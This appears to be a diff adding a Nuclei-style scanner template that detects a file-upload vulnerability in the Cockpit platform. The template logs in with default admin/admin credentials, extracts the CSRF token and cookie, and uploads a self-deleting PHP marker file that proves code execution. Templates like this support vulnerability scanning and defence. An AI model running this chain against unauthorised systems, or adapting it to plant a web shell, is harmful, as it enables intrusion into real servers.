@@ -1,0 +1,67 @@
+id: cockpit-shuzi-upload-fileupload
+
+info:
+  name: cockpit-shuzi-upload-fileupload
+  author: HackTwo
+  severity: high
+  description: cockpit 数字平台 upload 存在文件上传漏洞。
+  tags: cockpit,fileupload
+  
+http:
+  - raw:
+      - |-
+        GET /auth/login?to=/ HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36
+      - |-
+        POST /auth/check HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36
+        Content-Length: 62
+
+        {"auth":{"user":"admin","password":"admin"},"csfr":"{{csrf}}"}
+      - |-
+        POST /assetsmanager/upload HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=---------------------------36D28FBc36bd6feE7Fb3
+        Cookie: {{cookie}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36
+        Content-Length: 350
+
+        -----------------------------36D28FBc36bd6feE7Fb3
+        Content-Disposition: form-data; name="files[]"; filename="BE1a3d.php"
+        Content-Type: text/php
+
+        <?php echo "1a6534222cFd04e8";unlink(__FILE__);?>
+        -----------------------------36D28FBc36bd6feE7Fb3
+        Content-Disposition: form-data; name="folder"
+
+        -----------------------------36D28FBc36bd6feE7Fb3--
+    extractors:
+      - type: regex
+        name: csrf
+        part: body
+        group: 1
+        regex:
+           - "csfr : \"(.*)\""
+        internal: true
+      - type: regex
+        name: cookie
+        part: header_2
+        group: 1
+        regex:
+           - "Set-Cookie: (.*); path=/"
+        internal: true
+      - type: regex
+        name: filename
+        part: body_3
+        group: 1
+        regex:
+           - "path\":\"(.*)\",\"title"
+        internal: true                  
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code_3==200 && contains(body_3, "uploaded") && contains(body_3, "BE1a3d.php") && contains(header_3, "application/json")'
+#/storage/uploads/2024/05/16/6645879356246BE1a3d.php
